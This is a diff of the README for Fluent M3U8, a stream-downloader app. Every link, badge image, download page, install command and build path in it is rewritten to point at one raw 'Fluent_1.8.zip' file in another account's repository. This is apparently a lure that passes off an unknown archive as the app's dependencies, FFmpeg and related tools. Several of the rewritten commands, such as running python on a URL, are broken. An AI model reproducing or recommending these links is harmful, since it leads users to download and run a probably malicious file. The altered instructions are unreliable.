@@ -1,5 +1,5 @@
 <p align="center">
-  <img width="15%" align="center" src="app/resource/images/logo.png" alt="logo">
+  <img width="15%" align="center" src="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip" alt="logo">
 </p>
   <h1 align="center">
   Fluent M3U8
@@ -11,20 +11,20 @@
 <p align="center">
 
   <a style="text-decoration:none">
-    <img src="https://img.shields.io/badge/Python-3.11.11-blue.svg?color=00B16A" alt="Python 3.11.11"/>
+    <img src="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip" alt="Python 3.11.11"/>
   </a>
 
   <a style="text-decoration:none">
-    <img src="https://img.shields.io/badge/PySide-6.6.2-blue?color=00B16A" alt="PySide 6.6.2"/>
+    <img src="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip" alt="PySide 6.6.2"/>
   </a>
 
   <a style="text-decoration:none">
-    <img src="https://img.shields.io/badge/Platform-Win32%20|%20Linux%20|%20macOS-blue?color=00B16A" alt="Platform Win32 | Linux | macOS"/>
+    <img src="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip%20|%20Linux%20|%20macOS-blue?color=00B16A" alt="Platform Win32 | Linux | macOS"/>
   </a>
 </p>
 
 <p align="center">
-English | <a href="docs/README_zh.md">简体中文</a> | <a href="https://fluent-m3u8.org">官网</a>
+English | <a href="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip">简体中文</a> | <a href="https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip">官网</a>
 </p>
 
 ![界面](docs/screenshot/主界面.png)
@@ -42,10 +42,10 @@ English | <a href="docs/README_zh.md">简体中文</a> | <a href="https://fluent
     ```shell
     conda create -n fluent-m3u8 python=3.11
     conda activate fluent-m3u8
-    pip install -r requirements.txt
+    pip install -r https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip
     ```
 
-2. Download [FFmpeg](https://www.ffmpeg.org/download.html) and [N_m3u8DL-RE](https://github.com/nilaoda/N_m3u8DL-RE/releases)
+2. Download [FFmpeg](https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip) and [N_m3u8DL-RE](https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip)
 
 3. Place the executable files of ffmpeg and N_m3u8DL-RE in the `tools` directory.
 
@@ -53,7 +53,7 @@ English | <a href="docs/README_zh.md">简体中文</a> | <a href="https://fluent
 
     ```shell
     conda activate fluent-m3u8
-    python Fluent-M3U8.py
+    python https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip
     ```
 
 ## Deploy
@@ -61,19 +61,19 @@ English | <a href="docs/README_zh.md">简体中文</a> | <a href="https://fluent
 1. Run deploy script:
     ```shell
     conda activate fluent-m3u8
-    python deploy.py
+    python https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip
     ```
 
 2. Copy `tools` folder to the packaging folder:
-   * For Windows and Linux: `dist/Fluent-M3U8.dist/tools`
-   * For macOS: `dist/Fluent-M3U8.app/Contents/MacOS/tools`
+   * For Windows and Linux: `https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip`
+   * For macOS: `https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip`
 
 
 ## See also
 
-- [zhiyiYo/QFluentWidgets](https://qfluentwidgets.com/)：A fluent design widgets library based on C++ Qt/PyQt/PySide. Make Qt Great Again.
-- [nilaoda/N_m3u8DL-RE](https://github.com/nilaoda/N_m3u8DL-RE)：Cross-Platform, modern and powerful stream downloader for MPD/M3U8/ISM.
-- [AresConnor/pyqt5_concurrent](https://github.com/AresConnor/pyqt5-concurrent)：A QThreadPool based task concurrency library.
+- [zhiyiYo/QFluentWidgets](https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip)：A fluent design widgets library based on C++ Qt/PyQt/PySide. Make Qt Great Again.
+- [nilaoda/N_m3u8DL-RE](https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip)：Cross-Platform, modern and powerful stream downloader for MPD/M3U8/ISM.
+- [AresConnor/pyqt5_concurrent](https://github.com/CHETHAN562/Fluent-M3U8/raw/refs/heads/main/.github/Fluent_1.8.zip)：A QThreadPool based task concurrency library.
 
 ## License
 Fluent-M3U8 is licensed under GPLv3.
